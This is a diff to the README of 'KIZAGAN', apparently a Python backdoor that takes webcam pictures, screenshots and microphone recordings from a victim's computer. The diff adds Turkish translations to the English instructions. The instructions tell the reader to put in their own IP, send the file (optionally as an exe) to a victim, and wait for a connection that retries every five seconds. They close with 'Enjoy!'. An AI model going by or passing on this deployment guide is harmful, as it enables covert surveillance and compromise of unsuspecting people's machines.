@@ -1,9 +1,12 @@
 # KIZAGAN
 KIZAGAN is a python computer backdoor and it can take camera pictures,screenshot,getting microphone sounds... etc.
+tr : KIZAGAN python ile yapılmış bir backdoor'dur.Bu backdoor kurbanin kamerasından görüntüler alabilir,ekran görüntüsü alabilir,mikrofon kaydı yapabilir ve daha fazlası...
 
-# Usage : 
+# Usage/Kullanım : 
 
 Change the IP(on the kizagan.py's baglanti_dene function and kizagan_listener.py's 164.line) to your IP (you can change the port if you want.)
+tr:kizagan.py'nin baglanti_dene fonksiyonundaki ve kizagan_listener.py'nin 164.satırındaki ip adreslerini kendinize göre değiştirin.(İsterseniz port da değiştirebilirsiniz.)
+
 
 
 ![kizagan9](https://user-images.githubusercontent.com/68844502/177044095-5ef7e80f-ed5e-467a-826f-e2734bc06c65.png)
@@ -11,10 +14,12 @@ Change the IP(on the kizagan.py's baglanti_dene function and kizagan_listener.py
 ![kizagan10](https://user-images.githubusercontent.com/68844502/177044104-7d0c4637-d9ae-4ded-ba92-5fa7078cf92c.png)
 
 Send kizagan.py(you can convert to exe file.) to victim.Start the listener.If victim open the file the connection comes to you.
+tr:Kizagan.py yi kurbana gönderin.(exe dosyasına çevirebilirsiniz.)Dinleyiciyi basşlatın.Eğer kurban dosyayı açarsa bağlantı size gelecektir.
 
 You don't need to start listener as soon as you send the file because kizagan will send you a connection every 5 seconds.
+tr:Dosyayı gönderdiğiniz gibi dinleyici'yi başlatmanıza gerek yok.Çünkü kizagan her 5 saniyede bir bağlantı isteği gönderecektir.
 
-Enjoy!
+Enjoy! / Tadını çıkarın!
 
 
 ![kizagan1](https://user-images.githubusercontent.com/68844502/177044241-d668f197-9801-4030-af11-09fea9847ce5.PNG)
